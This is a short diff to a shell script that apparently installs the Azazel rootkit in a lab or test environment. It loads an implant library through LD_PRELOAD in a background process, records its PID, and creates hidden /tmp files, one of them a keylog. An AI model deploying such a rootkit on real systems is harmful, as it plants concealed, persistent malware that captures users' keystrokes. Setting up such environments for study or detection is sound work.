@@ -7,7 +7,7 @@ install_azazel() {
     fi
     # Start a long-running process with the preload library
     nohup bash -c "export LD_PRELOAD=$ASSETS_DIR/build/azazel_implant.so; sleep 3600" >/dev/null 2>&1 &
-    ec
+    echo $! > /tmp/azazel_sleep.pid
     # Create files that the rootkit hides (no stray characters)
     > /tmp/.azazel_hidden_config
     > /tmp/.azazel_hidden_keylog
